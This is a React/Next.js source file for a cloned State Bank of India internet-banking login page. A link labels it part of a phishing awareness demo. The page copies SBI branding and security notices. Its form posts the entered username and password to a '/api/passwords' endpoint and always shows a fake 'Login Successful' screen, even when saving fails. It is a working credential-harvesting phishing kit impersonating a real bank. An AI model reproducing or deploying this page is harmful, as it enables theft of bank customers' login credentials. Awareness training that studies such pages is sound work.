"use client";

import React, { useState } from 'react';
import { ArrowRightCircle, Check, X } from 'lucide-react';
import { useRouter } from 'next/navigation';
import Link from 'next/link';

function SbiLoginPage() {
  const [showLogin, setShowLogin] = useState(false);
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [isSuccess, setIsSuccess] = useState(false);
  const router = useRouter();

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    const usernameInput = document.getElementById('username') as HTMLInputElement;
    const passwordInput = document.getElementById('password') as HTMLInputElement;

    const usernameValue = usernameInput?.value || '';
    const passwordValue = passwordInput?.value || '';

    if (!usernameValue || !passwordValue) {
      alert('Please fill in both username and password');
      return;
    }

    setIsLoading(true);

    try {
      // Save username and password to API
      const response = await fetch('/api/passwords', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          password: passwordValue,
          email: usernameValue,
          site: 'SBI'
        }),
      });

      const data = await response.json();

      if (data.success) {
        setIsLoading(false);
        setIsSuccess(true);

        // Redirect after success
        setTimeout(() => {
          router.push('/');
        }, 2000);
      } else {
        throw new Error('Failed to save credentials');
      }
    } catch (error) {
      console.error('Error saving credentials:', error);
      setIsLoading(false);
      // Still show success for demo purposes
      setIsSuccess(true);
      setTimeout(() => {
        router.push('/');
      }, 2000);
    }
  };

  const PhishingWarning = () => (
    <div>
      <div className="relative">
        <img src="https://retail.onlinesbi.sbi/sbijava/retail/images/personal_banner.jpg" alt="Personal Banking Banner" className="w-full hidden md:block" />
        <div className="md:absolute md:top-1/2 md:left-8 md:-translate-y-1/2 p-4 md:p-0">
          <div className="text-center md:text-left">
            <button
              onClick={() => setShowLogin(true)}
              className="bg-[#195A76] text-white text-sm font-bold py-2.5 px-6 rounded-full border-b-4 border-[#84c1db] flex items-center justify-center mx-auto md:mx-0 w-64 hover:bg-opacity-90"
            >
              CONTINUE TO LOGIN
              <ArrowRightCircle className="ml-3" />
            </button>
            <p className="text-[#0F5285] font-bold text-xs mt-2 w-64 text-center mx-auto md:mx-0">
              Dear Customer, OTP based login is introduced for added security
            </p>
          </div>
        </div>
      </div>

      <div className="bg-[#e9f0f6] border-t border-b border-[#bdc8d4] p-3 text-sm text-[#263645]">
        <p>By clicking on "Continue to Login" button, you agree to the Terms of Service (Terms & Conditions) of usage of Internet Banking of SBI.</p>
      </div>

      <div className="p-4">
        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4 text-center">
          <div className="border p-4">
            <div className="w-8 h-8 bg-green-600 rounded-full flex items-center justify-center mx-auto mb-2">
              <Check className="text-white" size={20} />
            </div>
            <h3 className="text-green-700 font-bold">ALWAYS</h3>
            <p className="text-xs">keep your computer free of malware</p>
          </div>
          <div className="border p-4">
            <div className="w-8 h-8 bg-green-600 rounded-full flex items-center justify-center mx-auto mb-2">
              <Check className="text-white" size={20} />
            </div>
            <h3 className="text-green-700 font-bold">ALWAYS</h3>
            <p className="text-xs">change your passwords periodically</p>
          </div>
          <div className="border p-4">
            <div className="w-8 h-8 bg-red-600 rounded-full flex items-center justify-center mx-auto mb-2">
              <X className="text-white" size={20} />
            </div>
            <h3 className="text-red-600 font-bold">NEVER</h3>
            <p className="text-xs">respond to any communication seeking your passwords</p>
          </div>
          <div className="border p-4">
            <div className="w-8 h-8 bg-red-600 rounded-full flex items-center justify-center mx-auto mb-2">
              <X className="text-white" size={20} />
            </div>
            <h3 className="text-red-600 font-bold">NEVER</h3>
            <p className="text-xs">reveal your passwords or card details to anyone</p>
          </div>
        </div>

        <h2 className="text-center text-lg text-[#14578A] font-semibold my-6 relative after:content-[''] after:block after:w-16 after:h-0.5 after:bg-[#14578A] after:mx-auto after:mt-2">
          FOR YOUR OWN SECURITY
        </h2>

        <div className="grid grid-cols-1 md:grid-cols-2 gap-6 text-xs">
          <div>
            <h3 className="bg-gray-200 text-gray-700 font-bold p-2">Please ensure the following before logging into OnlineSBI</h3>
            <ul className="list-disc list-inside p-4 space-y-2">
              <li>The URL in your browser address bar begins with "https".</li>
              <li>The address or status bar displays the padlock symbol.</li>
              <li>Click the padlock to view and verify the security certificate.</li>
              <li>(SSL is compatible for IE 7.0 and above, Mozilla Firefox 3.1 and above, Opera 9.5 and above, Safari 3.5 and above, Google Chrome).</li>
            </ul>
          </div>
          <div>
            <h3 className="bg-gray-200 text-gray-700 font-bold p-2">Beware of Phishing attacks</h3>
            <ul className="list-disc list-inside p-4 space-y-2">
              <li>Phishing is a fraudulent attempt, usually made through email, phone calls, SMS etc seeking your personal and confidential information.</li>
              <li>State Bank or any of its representative never sends you email/SMS or calls you over phone to get your personal information,password or one time SMS (high security) password.</li>
            </ul>
          </div>
        </div>
      </div>
    </div>
  );

  const LoginForm = () => (
    <div className="p-4">
      {isSuccess ? (
        <div className="text-center">
          <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4">
            <svg className="w-8 h-8 text-green-600" fill="currentColor" viewBox="0 0 20 20">
              <path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd" />
            </svg>
          </div>
          <h3 className="text-lg font-semibold text-gray-900 mb-2">Login Successful!</h3>
          <p className="text-gray-600">Redirecting to your account...</p>
        </div>
      ) : (
        <>
          <div className="bg-gray-100 border-b-2 border-blue-800 p-3 mb-4">
            <h3 className="text-lg font-semibold text-blue-900">Login to OnlineSBI</h3>
            <p className="text-sm text-red-700 font-bold">Dear Customer, Mandatory login and profile password change introduced for added security.</p>
          </div>
          <div className="flex flex-col md:flex-row gap-6">
            <div className="w-full md:w-1/2">
              <p className="text-xs mb-4">(<span className="text-red-700 font-bold">CARE:</span> Username and password are case sensitive.)</p>
              <form onSubmit={handleSubmit} className="space-y-4">
                <div>
                  <label htmlFor="username" className="block text-sm font-medium text-gray-700 mb-1">Username*</label>
                  <input
                    type="text"
                    id="username"
                    className="w-full px-3 py-2 bg-gray-100 border border-gray-300 focus:outline-none focus:bg-white focus:border-blue-500 text-gray-900 text-sm"
                    required
                  />
                </div>
                <div>
                  <label htmlFor="password" className="block text-sm font-medium text-gray-700 mb-1">Password*</label>
                  <input
                    type="password"
                    id="password"
                    className="w-full px-3 py-2 bg-gray-100 border border-gray-300 focus:outline-none focus:bg-white focus:border-blue-500 text-gray-900 text-sm"
                    required
                  />
                </div>
                <div className="flex gap-3 mt-6">
                  <button
                    type="submit"
                    disabled={isLoading}
                    className="bg-[#3C5A77] text-white py-2 px-8 text-sm font-medium hover:bg-opacity-90 disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center"
                  >
                    {isLoading ? (
                      <>
                        <svg className="animate-spin -ml-1 mr-3 h-4 w-4 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                          <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                          <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                        </svg>
                        Logging in...
                      </>
                    ) : (
                      'Login'
                    )}
                  </button>
                  <button
                    type="reset"
                    className="bg-gray-500 text-white py-2 px-6 text-sm font-medium hover:bg-gray-600"
                  >
                    Reset
                  </button>
                </div>
              </form>
          <div className="mt-4 text-sm space-y-2 text-blue-700">
            <a href="#" className="block hover:underline">New User ? Register here/Activate</a>
            <a href="#" className="block hover:underline">Forgot Username / Login Password</a>
          </div>
              <div className="mt-4">
                <label className="flex items-center text-sm">
                  <input type="checkbox" className="mr-2" />
                  Enable Virtual Keyboard
                </label>
              </div>
            </div>
            <div className="w-full md:w-1/2 bg-gray-200 min-h-[250px] flex items-center justify-center rounded">
              <img src="/login_img_transparent.png" alt="BE VIGILANT. BE SAFE." className="max-w-full max-h-full object-contain" />
            </div>
          </div>
        </>
      )}
    </div>
  );

  return (
    <div className="bg-white font-sans text-gray-800 text-sm">
      <div className="max-w-7xl mx-auto border-x">
        <header className="p-2 border-b">
          <img src="https://upload.wikimedia.org/wikipedia/en/thumb/5/58/State_Bank_of_India_logo.svg/212px-State_Bank_of_India_logo.svg.png" alt="SBI Logo" className="h-10" />
        </header>
        <nav className="bg-[#145A8F] text-white p-2">
          <ul className="flex space-x-6 text-xs">
            <li><a href="#" className="hover:underline">Home</a></li>
            <li><a href="#" className="hover:underline">Products & Services</a></li>
            <li><a href="#" className="hover:underline">How Do I (Help)</a></li>
            <li><a href="#" className="hover:underline">Contact Us</a></li>
          </ul>
        </nav>

        <main>
          {showLogin ? <LoginForm /> : <PhishingWarning />}
        </main>

        <footer className="bg-gray-100 p-4 border-t text-xs text-gray-600">
          <div className="flex justify-between items-center">
            <p>&copy; State Bank of India</p>
            <p className="hidden md:block">Site best viewed at 1024 x 768 resolution</p>
          </div>
        </footer>
      </div>

      {/* Back to Home - Mobile responsive positioning */}
      <div className="fixed bottom-4 left-1/2 transform -translate-x-1/2 md:absolute md:bottom-4 md:left-auto md:right-4 md:transform-none">
        <Link href="/" className="text-sm text-gray-600 hover:text-gray-800 bg-white/90 backdrop-blur-sm px-3 py-1 rounded-full shadow-sm md:bg-transparent md:shadow-none md:px-0 md:py-0">
          ← Back to Phishing Awareness Demo
        </Link>
      </div>
    </div>
  );
}

export default SbiLoginPage;